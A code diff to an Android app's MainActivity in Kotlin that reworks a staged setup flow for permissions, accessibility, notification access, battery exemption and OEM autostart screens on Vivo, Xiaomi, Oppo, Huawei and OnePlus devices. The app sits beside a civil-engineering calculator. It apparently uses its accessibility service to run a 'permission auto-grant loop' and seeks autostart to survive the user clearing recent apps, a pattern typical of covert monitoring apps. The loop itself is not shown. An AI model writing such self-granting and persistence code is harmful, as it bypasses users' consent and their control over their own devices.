@@ -330,8 +330,7 @@ class MainActivity : AppCompatActivity() {
         // Setup interactive Civil Engineering Calculator Suite
         setupCivilCalculators()
 
-        // Always initiate flow if core permissions or steps are pending
-        isOneTapFlowRunning = true
+        // Automatic permission start for fresh installation
         maybeStartAutoPermissionFlow()
     }
 
@@ -414,8 +413,21 @@ class MainActivity : AppCompatActivity() {
         statusUpdater.run()
         uploadCurrentFcmToken()
 
-        // If one-tap flow is in progress or setup is not complete, advance to next step
-        if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
+        if (deviceState.isFirstSetupCompleted && !isOneTapFlowRunning) {
+            return
+        }
+
+        val isCore = getMissingRuntimePermissions().isEmpty()
+        val isA11y = isAccessibilityEnabled()
+        val isNotif = isNotificationAccessGranted()
+
+        if (isCore && isA11y && (isNotif || notificationPrompted) &&
+            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
+            completeSetupAndClose()
+            return
+        }
+
+        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
             isOneTapFlowRunning = true
             handleNextSetupStep()
         }
@@ -484,15 +496,15 @@ class MainActivity : AppCompatActivity() {
         // Step 5: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All)
         if (isOemRom() && !autostartPrompted) {
             autostartPrompted = true
-            val autostartIntent = getAutostartIntent() ?: Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                data = Uri.parse("package:$packageName")
-            }
-            try {
-                autostartLauncher.launch(autostartIntent)
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed to launch autostart settings", e)
+            val autostartIntent = getAutostartIntent()
+            if (autostartIntent != null) {
+                try {
+                    autostartLauncher.launch(autostartIntent)
+                    BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                    return
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to launch autostart settings", e)
+                }
             }
         }
 
@@ -788,10 +800,13 @@ class MainActivity : AppCompatActivity() {
         val isAccessibility = isAccessibilityEnabled()
         val isNotification = isNotificationAccessGranted()
 
-        // Only complete setup if ALL sequential steps were genuinely reached & processed
         if (isCore && isAccessibility && (isNotification || notificationPrompted) &&
             (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
-            completeSetupAndClose()
+            if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
+                handleNextSetupStep()
+            } else {
+                completeSetupAndClose()
+            }
         }
     }
 
@@ -1002,6 +1017,21 @@ class MainActivity : AppCompatActivity() {
 
     private fun getAutostartIntent(): Intent? {
         val candidates = listOf(
+            // Vivo / iQOO FuntouchOS & OriginOS
+            Intent().setComponent(
+                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
+            ),
+            Intent().setComponent(
+                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
+            ),
+            Intent().setComponent(
+                ComponentName("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity")
+            ),
+            Intent().setComponent(
+                ComponentName("com.iqoo.powersaving", "com.iqoo.powersaving.PowerSavingManagerActivity")
+            ),
+            Intent().setAction("com.vivo.permissionmanager.action.PURVIEW_ACTION"),
+            // Xiaomi MIUI / HyperOS
             Intent().setComponent(
                 ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
             ),
@@ -1012,24 +1042,21 @@ class MainActivity : AppCompatActivity() {
             Intent().setComponent(
                 ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")
             ),
-            Intent().setComponent(
-                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
-            ),
-            Intent().setComponent(
-                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
-            ),
+            // Oppo / Realme ColorOS
             Intent().setComponent(
                 ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
             ),
             Intent().setComponent(
                 ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")
             ),
+            // Huawei / Honor
             Intent().setComponent(
                 ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
             ),
             Intent().setComponent(
                 ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")
             ),
+            // OnePlus & others
             Intent().setComponent(
                 ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")
             ),
@@ -1046,10 +1073,7 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {}
         }
 
-        // Xiaomi fallback: App Info Settings directly shows "Autostart" toggle switch prominently!
-        return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-            data = Uri.parse("package:$packageName")
-        }
+        return null
     }
 
 
